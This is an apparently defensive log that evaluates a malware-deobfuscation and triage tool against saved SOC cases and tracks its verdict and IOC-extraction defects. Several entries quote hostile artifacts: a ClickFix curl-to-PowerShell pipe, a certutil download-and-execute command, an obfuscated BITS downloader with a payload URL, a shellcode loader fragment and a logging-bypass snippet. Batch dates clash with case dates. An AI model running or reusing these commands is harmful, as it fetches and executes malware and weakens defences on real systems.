# NivXRay — Real-World Usage Log

_Started 2026-02-28. Purpose: let real SOC cases (not guesses) prioritize v1.6.0._

**Status:** Feature development frozen at v1.6.0 Phase 1a. This log is the sole input for unfreezing.

---

## How this log drives the roadmap

1. Every real investigation gets one entry below.
2. Every `UNKNOWN` verdict must answer: **"What additional evidence would have promoted this to a higher-confidence verdict?"**
3. When a `Missing Evidence` category repeats across ~50–100 cases, it earns a phase (Phase 1b, later, etc.).
4. No new heuristics are added on guesses. Patterns must emerge from this file first.

---

## Missing-Evidence → Phase mapping (living table)

| Missing Evidence          | Target Phase | Notes                                                     |
|---------------------------|--------------|-----------------------------------------------------------|
| Executable name           | Phase 1b     | Vendor CLI recognition + weighted evidence                |
| Digital signature / signer| Phase 1b     | Known-good signer → positive benign evidence              |
| Parent process            | Phase 1b     | Process-tree context weighting                            |
| File hash                 | Phase 1b     | Reputation lookup gate                                    |
| Network telemetry         | Later        | Requires telemetry ingest surface                         |
| Registry context          | Later        | Requires endpoint context surface                         |

_Update the phase column only when repeated evidence supports it._

---

## Vendors in scope for case collection

Cisco XDR · QRadar · Microsoft Defender · Secure Endpoint · Umbrella · IronPort · Sophos

---

## Entry template (copy for each real case)

```
### Case <NNNN> — YYYY-MM-DD — <short-title>

- Vendor / Source:            (e.g., Cisco XDR alert #1234)
- Sample class:               (e.g., ps-encoded, cmd-lolbin, base64-macro, js-obfuscated, msi-installer,
                               wmi-persist, scheduled-task, defender-tamper, ps-download-cradle, dll-sideload)
- Original artifact:          (paste command line / script / shellcode; redact PII)
- NivXRay current output:     (verdict band + confidence + top evidence keys)
- Expected analyst conclusion:(what an experienced SOC analyst would call it)
- Outcome bucket:             Correct | Missing Evidence | Incorrect Reasoning | Incorrect Verdict
- If UNKNOWN — appropriate?:  YES (evidence truly insufficient) | NO (should have decided)
- Missing evidence:           (executable-name | signer | parent-process | hash | net-telemetry | registry | other | none)
- Reusable capability gap?:   YES → log it | NO but Correct → log as regression | NO + env-specific → do not log
- Would-fix priority:         P0 | P1 | P2 | none
- Notes:                      (analyst commentary, only lessons that generalize)
```

---

## Entries

<!-- Paste one Entry block per real case investigated below this line. -->

### Case 0001 — 2026-02-28 — PS_ASCII_XOR_IEX archetype garbled output

- Vendor / Source:            Analyst-supplied training sample (obfuscation demo)
- Sample class:               ps-encoded (integer-array XOR + IEX)
- Original artifact:          `powershell -NoProfile -NonInteractive "((97,68,95,66,83,27,126,89,69,66,...) | ForEach-Object {[Char]($_ -bxor '0x36')} ) -join '' | Invoke-Expression"`
- NivXRay current output:     Verdict `MALICIOUS 100/100`; OUTPUT panel showed garbled `.)+Knuhy1Tsoh<;Typps<Ksnpx=;<...`; IOCs/TI/OSINT empty
- Expected analyst conclusion:Decoded plaintext = `Write-Host 'Hello World!' -ForegroundColor Green; Write-Host 'Obfuscation Rocks!' -ForegroundColor Green` (benign obfuscation demo)
- Outcome bucket:             `Incorrect Reasoning`
- If UNKNOWN — appropriate?:  n/a (verdict was MALICIOUS, not UNKNOWN)
- Missing evidence:           none — the deterministic decoder DID produce the correct plaintext; a downstream output-selection defect discarded it
- Reusable capability gap?:   YES → correctness bug in existing capability, not a missing capability
- Would-fix priority:         P0 (immediate — correctness defect in existing decoder path)
- Notes:
  - Root cause: the canonical output shown to the analyst came from replaying a non-self-contained recipe instead of using the already-correct deterministic decoder output.
  - Server-side: `wrapper_archetypes.py:4224` emits archetype chain steps with `args: {}`, so the recovered XOR key (0x36) is not persisted onto the `xor` step.
  - Client-side: `selectCanonicalOutput.js` replayed the recipe via `/api/recipe/run`; the replay ran `xor` with default key `0x2A`, producing garbage; the selector then preferred the garbage over the correct `result.output`.
  - Fix (narrow): frontend guard — skip recipe replay when `engine.startsWith("archetype:")`. See `/app/frontend/src/lib/selectCanonicalOutput.js`.
  - Regression tests: `/app/backend/tests/test_ps_ascii_xor_iex_output_selection.py` (3 invariants: handler-correct, engine-name-stable, recipe-replay-not-self-reproducible).
  - Verdict-band separate concern: `MALICIOUS 100/100` on a Hello-World payload is a distinct false-positive driven by YARA-pattern presence alone. Not addressed in this fix — logged as a future capability gap once more evidence accumulates (see Missing-Evidence table).



---

## Historical case-mining batch · 2026-02-28

**Scope:** First batch of 5 workspace_cases sampled by verdict class (2 Malicious, 1
Suspicious, 1 Partial, 1 Corrupted), reviewed against the frozen 9-category template
in `OPERATIONAL_LOOP.md` under the three-tier evidence discipline (Observable /
Inference / Hypothesis).

Reviews evaluate the *stored* verdict/output/IOCs/MITRE from each case as of the
saved run. Re-execution of the artifact was not required — the stored output is
the historical truth being scored.

**Numbering note:** Case 0002 (Meterpreter reverse_http) remains pending Option A
screenshots. Historical batch is numbered 0003–0007 to reserve 0002 for the
live-user case in flight.

---

### Case 0003 — 2026-07-21 — PowerShell byte-array shellcode loader (`ToInvestigate`)

- Vendor / Source:            Analyst-saved workspace case `094ca4bf-c6d6…`
- Sample class:               ps-encoded (byte-array + Base64 + multi-byte XOR + x86 shellcode)
- Original artifact:          `[Byte[]]$var_code = [System.Convert]::FromBase64String('38uqIyMjQ6rGEvFH…')`
- NivXRay stored output:      Verdict `Malicious 80/100`; 10 indicators; IOCs `ips=[149.28.81.19]`; MITRE `T1140, T1027, T1055, T1620`; reason `"MSFvenom x86 prologue (cld · call) — first 2 bytes: fc e8"`

**Three-tier evidence separation**
- Observable evidence:        `fc e8` x86 prologue bytes; decoded shellcode fragments `hnet`, `hwiniThLw&`, `WWWWWh:Vy`, `D$$[[aYZQ`, `RRRSRPh`; IP `149.28.81.19`; multi-byte XOR key recovered; base64 layer peeled
- Evidence-based inference:   Metasploit / Cobalt Strike x86 stager (WinINet imports, IE9 UA present in shellcode)
- Analyst hypothesis (excluded from scoring): specific stager variant (reverse_http vs reverse_https), campaign attribution

**Nine-category review**

| Category                | Assessment              | Reasoning                                                                                                     |
| ----------------------- | ----------------------- | ------------------------------------------------------------------------------------------------------------- |
| Evidence Sufficiency    | **Sufficient**          | Enough observable evidence for a malicious x86 shellcode verdict.                                              |
| Decode Completeness     | **Pass**                | Base64 + multi-byte XOR peeled; shellcode exposed with recognisable fragments.                                 |
| IOC Completeness        | **Pass**                | `149.28.81.19` extracted from shellcode; no URL/domain present in the payload to extract.                     |
| MITRE Mapping           | **Appropriate**         | T1140, T1027, T1055, T1620 all supported by observable evidence.                                              |
| Verdict                 | **Useful**              | "Malicious 80%" with 10 indicators is appropriate given the evidence.                                          |
| Explanation Quality     | **Clear**               | Reason cites specific bytes (`fc e8`) and technique labels traceable to indicators.                            |
| Evidence Traceability   | **Yes**                 | Every indicator maps to an observable fact.                                                                    |
| Analyst Notes           | —                       | Would have added T1071.001 (App-layer C2 protocol) given IP + UA present in shellcode; not a defect — the shellcode was static and network protocol is an inference. |
| Action                  | **No Action**           | First observation; no gap identified.                                                                          |

---

### Case 0004 — 2026-07-20 — Multi-layer numeric-obfuscated PowerShell (`Big Whale`)

- Vendor / Source:            Analyst-saved workspace case `308e5a61-20ef…`
- Sample class:               ps-encoded (Base64 UTF-16 wrapper → numeric-delta obfuscation layer)
- Original artifact:          `powershell.exe -e XwAnAFwAeAAzAGIAXAB4ADMANABcAHgAMwBjAFwAeAAzADgA…`
- NivXRay stored output:      Verdict `Malicious 70/100`; 6 indicators; IOCs empty; MITRE `T1059.001, T1027.010, T1027`; reason `"LOLBAS binary observed: powershell.exe"`

**Three-tier evidence separation**
- Observable evidence:        `powershell.exe -e` prefix; Base64 peeled to UTF-16 hex-escape string; further decode yields numeric-delta layer `;4<8;<8650786…` (unresolved)
- Evidence-based inference:   Heavy multi-layer obfuscation is itself a strong malicious signal; the final payload is not reached
- Analyst hypothesis (excluded): whether the final payload is a loader vs cred stealer

**Nine-category review**

| Category                | Assessment              | Reasoning                                                                                                     |
| ----------------------- | ----------------------- | ------------------------------------------------------------------------------------------------------------- |
| Evidence Sufficiency    | **Partially Sufficient**| Enough to warrant *malicious class*; not enough for specific technique attribution since decode stopped early. |
| Decode Completeness     | **Partial**             | Decoder terminated at the numeric-delta layer; the final payload was not surfaced.                             |
| IOC Completeness        | **Partial**             | 0 IOCs — but the unresolved layer prevents extraction. Not a miss on the current decode depth; a decode-depth issue. |
| MITRE Mapping           | **Appropriate**         | T1059.001 + T1027.010 justified.                                                                              |
| Verdict                 | **Too Weak**            | 70% Malicious with "LOLBAS binary observed" as the primary indicator understates the case — multi-layer nesting is a stronger signal than LOLBAS presence alone. |
| Explanation Quality     | **Partial**             | Reason cites LOLBAS but does not flag decode-chain incompleteness — analysts reading this may miss that the true payload is unrevealed. |
| Evidence Traceability   | **Yes**                 | Indicators tie back to observed facts.                                                                        |
| Analyst Notes           | —                       | Pattern to watch: does NivXRay's decoder terminate on the numeric-delta layer often? If so, this is a decoder-depth gap. Log as candidate recurring pattern **P-DECODER-DEPTH**. |
| Action                  | **Monitor**             | First occurrence of the pattern; no ADR.                                                                       |

---

### Case 0005 — 2026-07-19 — Base32 nested benign training string (`April`)

- Vendor / Source:            Analyst-saved workspace case `34c374fb-a32a…`
- Sample class:               training-artifact (Base32 → Base64 → Base64 → plaintext)
- Original artifact:          `GQ4SANJQEA2TIIBTGIQDIOJAGUYCANJSEAZTEIBUHEQDIOBAGQ4SAMZSEA2TIIBVGMQDGMRAGQ4SANJQEA2TAIBTGIQDIOJA…`
- NivXRay stored output:      Verdict `Suspicious 80/100`; 5 indicators; IOCs empty; MITRE `T1027`; reason `"MITRE ATT&CK T1027 — Standalone long base64 blob"`
- Decoded content:            `"SOC Challenge: If you can read this, you decoded it correctly."`

**Three-tier evidence separation**
- Observable evidence:        Decoded plaintext is a benign training string; no IOCs; no malicious API surface; no LOLBAS invocation
- Evidence-based inference:   BENIGN — training / CTF challenge artifact
- Analyst hypothesis (excluded): None

**Nine-category review**

| Category                | Assessment              | Reasoning                                                                                                     |
| ----------------------- | ----------------------- | ------------------------------------------------------------------------------------------------------------- |
| Evidence Sufficiency    | **Sufficient**          | Decoded text is unambiguous.                                                                                   |
| Decode Completeness     | **Pass**                | Full Base32 → Base64 → Base64 chain resolved to plaintext.                                                     |
| IOC Completeness        | **Pass**                | Nothing to extract (benign content).                                                                          |
| MITRE Mapping           | **Missing**             | T1027 mapped on encoding **form** alone; content is benign. Applying ATT&CK to a training string overstates severity. |
| Verdict                 | **Too Strong**          | "Suspicious 80%" for text that literally says "you decoded it correctly." The verdict is driven by encoding structure, not decoded content. |
| Explanation Quality     | **Poor**                | Reason cites T1027 (structural signal) rather than the benign decoded content the analyst can see.             |
| Evidence Traceability   | **Yes** (technically)   | Trail is traceable, but traces back to *encoding form* not *decoded content*.                                  |
| Analyst Notes           | —                       | This is the **verdict-evidence gating** pattern (previously deferred issue, handoff §"Pending"). The gap: verdict driven by structural signal even when decoded content is provably benign. Log as recurring-pattern candidate **P-VERDICT-STRUCTURAL**. |
| Action                  | **Monitor**             | 1st observation of this specific pattern in the historical batch; no ADR.                                       |

---

### Case 0006 — 2026-07-21 — Trivial "hello world" test case

- Vendor / Source:            Auto-generated test case `9f3b4d83-229c…` (`TEST_case_feb2026_351733`)
- Sample class:               test-artifact (Base64 → plaintext)
- Original artifact:          `aGVsbG8gd29ybGQ=`
- NivXRay stored output:      Verdict card label `Partial Decode` · confidence 25; investigation-summary block inside output text says `"Suspicious · 45/100"`; 0 indicators on verdict card; IOCs empty; MITRE `[]`

**Three-tier evidence separation**
- Observable evidence:        Decoded plaintext = `"hello world"` (11 chars ASCII); no IOCs; no API surface; no LOLBAS
- Evidence-based inference:   BENIGN
- Analyst hypothesis (excluded): None

**Nine-category review**

| Category                | Assessment              | Reasoning                                                                                                     |
| ----------------------- | ----------------------- | ------------------------------------------------------------------------------------------------------------- |
| Evidence Sufficiency    | **Sufficient**          | Output is 11 ASCII chars, clearly benign.                                                                     |
| Decode Completeness     | **Pass**                | Base64 correctly resolved.                                                                                    |
| IOC Completeness        | **Pass**                | Nothing to extract.                                                                                            |
| MITRE Mapping           | **Appropriate**         | Empty list is correct for benign text.                                                                        |
| Verdict                 | **Too Strong**          | Summary block claims "Suspicious 45/100" for `"hello world"`. Verdict card label is "Partial Decode" — two conflicting surfaces for the same case. |
| Explanation Quality     | **Poor**                | Verdict card has 0 indicators, empty `reason`. Summary block asserts 45/100 without cited evidence.            |
| Evidence Traceability   | **No**                  | "Suspicious 45/100" in summary block is not backed by any indicator.                                          |
| Analyst Notes           | —                       | Second observation of **P-VERDICT-STRUCTURAL** (encoding form driving verdict). Also surfaces a distinct UI gap: verdict card label ≠ summary block verdict. Marked as note-only since case is a synthetic test. |
| Action                  | **Monitor**             | Same recurring pattern candidate as Case 0005 (P-VERDICT-STRUCTURAL); no ADR yet.                             |

---

### Case 0007 — 2026-07-18 — AMSI-bypass PowerShell with corrupted GZIP inner layer (`Corrupted_Gzip`)

- Vendor / Source:            Analyst-saved workspace case `301f850c-43d6…`
- Sample class:               ps-encoded + gzip (corrupted) — AMSI / ScriptBlockLogging bypass in outer PowerShell
- Original artifact:          `-noni -nop -w hidden -c $smrA=((''+'E'+'n{0}b'+'leSc'+'ri{2'+'}tBloc{3}{1}ogging')-f'a','L','p','k'); … $zeXlF=[Ref].Assembly.GetType(…) …`
- NivXRay stored output:      Verdict card label `None` · empty reason · 0 indicators; output = `[GZIP_CORRUPT] error: Error -3 while decompressing data`; IOCs `domains=[stem.ma]`; MITRE `null`

**Three-tier evidence separation**
- Observable evidence:        `EnableScriptBlockLogging` string being reconstructed via `-f` format-string obfuscation in the OUTER (successfully decoded) PowerShell; `[Ref].Assembly.GetType(…)` reflection reference; `-noni -nop -w hidden` execution flags; inner gzip layer corrupt
- Evidence-based inference:   Anti-logging / Defender-tamper pattern (T1562.001 or T1562.006); reflection-based bypass — commonly seen in loader stagers
- Analyst hypothesis (excluded): Which specific bypass family (Empire, PowerSploit, custom)

**Nine-category review**

| Category                | Assessment              | Reasoning                                                                                                     |
| ----------------------- | ----------------------- | ------------------------------------------------------------------------------------------------------------- |
| Evidence Sufficiency    | **Sufficient**          | The RAW INPUT alone contains enough evidence for at least Suspicious — decode failure of the inner layer does not remove upstream observations. |
| Decode Completeness     | **Fail**                | Gzip layer corrupt; salvage disabled. Acceptable per corpus policy.                                            |
| IOC Completeness        | **Partial**             | Extracted `stem.ma` domain, but missed the primary signal: `EnableScriptBlockLogging` reconstruction is present in the input.  |
| MITRE Mapping           | **Missing**             | Should have flagged **T1562.001** (Impair Defenses) or **T1562.006** (Indicator Blocking). Instead: MITRE = `null`. |
| Verdict                 | **Too Weak**            | Verdict card label `None`. When one decoder step fails, upstream findings appear to be discarded rather than preserved. |
| Explanation Quality     | **Poor**                | 0 indicators, empty reason, no analyst-facing explanation of why the verdict is null.                          |
| Evidence Traceability   | **No**                  | No traceable indicators produced.                                                                              |
| Analyst Notes           | —                       | This is a distinct pattern from P-VERDICT-STRUCTURAL. It is **verdict-collapse-on-chain-failure**: when a mid-chain decoder fails, the platform emits a null/None verdict card even when the raw input contains strong signals. Log as candidate recurring pattern **P-CHAIN-FAILURE-VERDICT-COLLAPSE**. |
| Action                  | **Monitor**             | First observation of this pattern; no ADR.                                                                     |

---

## Batch summary · patterns emerging across Cases 0001–0007

Three candidate recurring patterns identified. **None** yet meets the ≥3-case
threshold for ADR drafting. All remain **Monitor** only.

| Pattern code                          | Description                                                                                       | Cases observed          | Count |
| ------------------------------------- | ------------------------------------------------------------------------------------------------- | ----------------------- | ----- |
| **P-VERDICT-STRUCTURAL**              | Verdict driven by encoding structure (base64/base32 length, YARA form) even when decoded content is benign. | 0001 (aside), 0005, 0006 | 2–3   |
| **P-DECODER-DEPTH**                   | Decoder terminates at an intermediate obfuscation layer; final payload unrevealed.                | 0004                    | 1     |
| **P-CHAIN-FAILURE-VERDICT-COLLAPSE**  | When a mid-chain decoder step fails, upstream findings are dropped and verdict card goes to null/None. | 0007                    | 1     |

**Note on P-VERDICT-STRUCTURAL:** Case 0001's Case-0001 entry (top of this file)
explicitly noted this as a *"separate concern, not addressed in this fix, logged
as a future capability gap once more evidence accumulates."* Case 0005 and Case
0006 are new independent observations. Count is currently **2 unambiguous** (0005,
0006) plus 1 partial (0001's aside). If Case 0002 (in flight) or any subsequent
case exhibits the same pattern, the ≥3 threshold will be crossed and an ADR
proposal (ADR-0007 · Verdict-Evidence Gating) will be drafted.

**No code changes made in this batch.** This is evidence-collection only, per the
2026-02-28 operator directive.


---

## Historical case-mining batch 2 · 2026-02-28

**Scope:** 5 more workspace_cases sampled for **sample-class diversity** (PE-embedded,
cmd-caret-obfuscation, ClickFix-style, RTF-embedded, certutil-LOLBAS). Reviews use
the same 9-category template. Numbering continues 0008–0012.

---

### Case 0008 — PE binary embedded in Base64 wrapper (`Do no download into your machine`)

- Source: workspace_cases `78851a40…`
- Sample class: **pe-executable-b64-wrapped**
- Artifact: `TVqQAAMAAAAEAAAA//8AALg…` (Base64 → MZ/PE header)
- Stored output: Malicious 70%; 4 indicators (`PE header validated, e_lfanew=0x108`); IOCs empty; MITRE `T1027`

**Evidence tiers**
- Observable: valid MZ signature, PE header offset 264, DOS stub "This program cannot be run in DOS mode"
- Inference: PE-in-b64 is a payload-delivery pattern
- Hypothesis (excluded): specific malware family

| Category | Assessment | Reasoning |
|---|---|---|
| Evidence Sufficiency | Sufficient | Valid PE structure is unambiguous |
| Decode Completeness | Pass | Base64 peeled cleanly |
| IOC Completeness | **Partial** | PE binary has extractable imports / IATs / embedded strings — none surfaced |
| MITRE Mapping | **Missing** | T1027 alone; T1105 (Ingress) and T1140 (Deobfuscate) also fit |
| Verdict | Useful | 70% Malicious is defensible |
| Explanation Quality | Clear | Reason cites PE-header offsets |
| Evidence Traceability | Yes | — |
| Analyst Notes | New pattern candidate **P-PE-INTROSPECTION** — decoder recognises PE structure but does not walk imports/strings for IOC extraction | — |
| Action | **Monitor** | 1st observation |

---

### Case 0009 — cmd caret ^ obfuscation + PS EncodedCommand + BITS download (`Suitable`)

- Source: workspace_cases `69bcf510…`
- Sample class: **cmd-caret + ps-encoded + bits-transfer**
- Artifact: `"C:\Windows\System32\cmd.exe" /c p^ow^ER^s^HE^LL -e WwBzAFkA…`
- Stored output: Malicious 90%; 15 indicators; IOCs `urls=[http://georgeprapas.com/cem/VVZMYLHaSOcblqo.exe]`, `domains=[georgeprapas.com]`; MITRE `T1197, T1082, T1105, T1140, T1497.003, T1059.001`

**Evidence tiers**
- Observable: caret defeated → PS EncodedCommand decoded → explicit `Start-BitsTransfer` + URL + `.exe` drop + time-delay loop
- Inference: staged downloader targeting Windows PE payload
- Hypothesis (excluded): specific family

| Category | Assessment | Reasoning |
|---|---|---|
| Evidence Sufficiency | Sufficient | — |
| Decode Completeness | **Pass** | Caret + UTF-16 base64 both handled |
| IOC Completeness | **Pass** | URL + domain extracted |
| MITRE Mapping | **Appropriate** | T1197 BITS, T1105 Ingress, T1497.003 sandbox-evasion all justified |
| Verdict | **Useful** | 90% appropriate |
| Explanation Quality | Clear | — |
| Evidence Traceability | Yes | — |
| Analyst Notes | Reference-quality case: what "good" looks like. No gap. | — |
| Action | **No Action** | — |

---

### Case 0010 — ClickFix-style curl-to-PowerShell chain (`ClickFix`)

- Source: workspace_cases `50701f35…`
- Sample class: **cmd-wildcard-lolbin + click-fix**
- Artifact: `cmd /c start /min cmd /v:on /k echo off & for /f %k in ('where curl.exe') do %k https://tommy-aa.lol/f | powershell.exe cmd …`
- Stored output: Malicious 95%; 15 indicators; IOCs `urls=[https://tommy-aa.lol/f]`, `domains=[chrome.nativemessaging.in, tommy-aa.lol]`; MITRE `T1059.003, T1218.010, T1583.001, T1027`

**Evidence tiers**
- Observable: cmd wildcards `where c*d.e?e`; caret `h^t^t^p^s^:^/^/`; curl → powershell pipe; `.lol` TLD
- Inference: ClickFix (paste-and-execute) technique — canonical fake-CAPTCHA lure
- Hypothesis (excluded): campaign attribution

| Category | Assessment | Reasoning |
|---|---|---|
| Evidence Sufficiency | Sufficient | — |
| Decode Completeness | Pass | Caret + wildcards resolved |
| IOC Completeness | Pass | URL + domains extracted |
| MITRE Mapping | **Missing** | Primary technique is **T1204.004** (User Execution: Malicious Copy and Paste) — not labelled |
| Verdict | Useful | 95% justified |
| Explanation Quality | Clear | — |
| Evidence Traceability | Yes | — |
| Analyst Notes | New pattern candidate **P-MITRE-CLICKFIX-COVERAGE** — ClickFix / paste-and-execute not surfaced as its own ATT&CK subtype | — |
| Action | **Monitor** | 1st observation |

---

### Case 0011 — RTF-embedded content with placeholder-looking IOCs (`NEW_Alert`)

- Source: workspace_cases `931851d1…`
- Sample class: **rtf-document**
- Artifact: `{\rtf1\ansi\ansicpg1252\cocoartf2870 \cocoatextscaling0 …`
- Stored output: Malicious 95%; 11 indicators; IOCs `urls=[http://127.0.0.1:40492/mcp\\\\]`, `ips=[127.0.0.1, 1.0.0.721]`, `domains=[resolved.provider.name]`; MITRE `T1059.001, T1057, T1082`; LOLBAS `Change.exe, Query.exe`

**Evidence tiers**
- Observable: RTF passthrough; localhost URL `127.0.0.1:40492/mcp`; extracted IP `1.0.0.721` (octet 721 > 255 = **not a valid IP**); domain `resolved.provider.name` (reads as placeholder text)
- Inference: MCP (Model Context Protocol) local callback — likely developer/AI-agent tooling, not C2
- Hypothesis (excluded): whether the RTF is genuinely malicious or holds AI-tooling metadata

| Category | Assessment | Reasoning |
|---|---|---|
| Evidence Sufficiency | **Partially Sufficient** | RTF context not fully inspectable from stored output |
| Decode Completeness | Pass | RTF passthrough is correct |
| IOC Completeness | **Partial (with false positives)** | `1.0.0.721` = invalid IP (octet >255); `resolved.provider.name` reads as placeholder |
| MITRE Mapping | **Incorrect** (leaning) | `T1059.001 PowerShell hidden` on an RTF is unsupported; LOLBAS `Change.exe`/`Query.exe` may be false positives from RTF style tokens |
| Verdict | **Too Strong** | 95% Malicious driven partly by localhost URL and placeholder-looking domain |
| Explanation Quality | Partial | Reason cites `127.0.0.1:40492/mcp` — localhost is not C2 |
| Evidence Traceability | Yes | Traceable — but traces back to over-extracted signals |
| Analyst Notes | Two new pattern candidates: **P-IOC-VALIDATION** (regex accepts IP octets >255) and **P-VERDICT-LOCALHOST** (verdict weight not discounted for `127.0.0.1`/RFC1918) | — |
| Action | **Monitor** | 1st observation of each |

---

### Case 0012 — Certutil LOLBAS urlcache download (`Real_Confirmed_Authorized Activity`)

- Source: workspace_cases `51448969…`
- Sample class: **certutil-lolbin-download**
- Artifact: `certutil -urlcache -f http://10.200.49.6:8080/FR-X2XmSY2X4F0ivU4nTYw %TEMP%\BfBjkkJBdU.exe & start /B %TEMP%\BfBjkkJBdU.exe`
- Stored output: Malicious 95%; 10 indicators; IOCs `urls=[…10.200.49.6:8080…]`, `ips=[10.200.49.6, 6.94.002.01]`; MITRE `T1105, T1059.003`; LOLBAS `certutil.exe`

**Evidence tiers**
- Observable: canonical `certutil -urlcache -f` LOLBIN pattern; URL points to RFC1918 `10.200.49.6:8080` internal IP; downloads to `%TEMP%\BfBjkkJBdU.exe` then executes with `start /B`; the extra extracted IP `6.94.002.01` has an octet with leading-zero + is unlikely to be a real IP present in this input
- Inference: post-exploitation stager on internal network (10.200.x = corporate/lab RFC1918)
- Hypothesis (excluded): whether "Authorized Activity" in the case name is genuine red-team consent

| Category | Assessment | Reasoning |
|---|---|---|
| Evidence Sufficiency | Sufficient | — |
| Decode Completeness | Pass | — |
| IOC Completeness | **Partial** | `6.94.002.01` extraction is suspect (leading-zero octets); no discrimination between internal (RFC1918) and external IPs |
| MITRE Mapping | Appropriate | T1105 + T1059.003 fit |
| Verdict | Useful | 95% justified for certutil-urlcache |
| Explanation Quality | Clear | — |
| Evidence Traceability | Yes | — |
| Analyst Notes | **2nd observation of P-IOC-VALIDATION** (invalid IP octets extracted) | — |
| Action | **Monitor** | Pattern approaches threshold |

---

## Updated pattern register (after Batches 1–2 · Cases 0001, 0003–0012)

| Pattern code                          | Description                                                              | Cases                    | Count | Status  |
| ------------------------------------- | ------------------------------------------------------------------------ | ------------------------ | ----- | ------- |
| **P-VERDICT-STRUCTURAL**              | Verdict driven by encoding structure when decoded content is benign      | 0005, 0006 (+ 0001 aside) | **2** | Monitor |
| **P-DECODER-DEPTH**                   | Decoder terminates on intermediate obfuscation layer                     | 0004                     | 1     | Monitor |
| **P-CHAIN-FAILURE-VERDICT-COLLAPSE**  | Mid-chain decoder failure → null verdict card despite raw-input signals  | 0007                     | 1     | Monitor |
| **P-PE-INTROSPECTION**                | PE structure recognised but imports/strings not walked for IOC extraction | 0008                     | 1     | Monitor |
| **P-MITRE-CLICKFIX-COVERAGE**         | ClickFix / paste-and-execute (T1204.004) not surfaced as its own ATT&CK  | 0010                     | 1     | Monitor |
| **P-IOC-VALIDATION**                  | IP-extraction regex accepts invalid octets (>255, leading zeros); no validation gate | 0011, 0012 | **2** | Monitor |
| **P-VERDICT-LOCALHOST**               | Verdict weight not discounted for `127.0.0.1` / RFC1918 URLs             | 0011                     | 1     | Monitor |

**None yet at the ≥3-case ADR threshold.** Two patterns (P-VERDICT-STRUCTURAL,
P-IOC-VALIDATION) are one independent observation away from triggering an ADR draft.

**Deliberate self-check:** Case 0002 (live Meterpreter) remains pending. If it
independently exhibits either P-VERDICT-STRUCTURAL or P-IOC-VALIDATION, the
threshold is crossed. If not, neither pattern is elevated on the strength of
similar-looking artifacts.

No code changes. No ADRs drafted. 10 cases banked toward the 20-case operational
milestone.

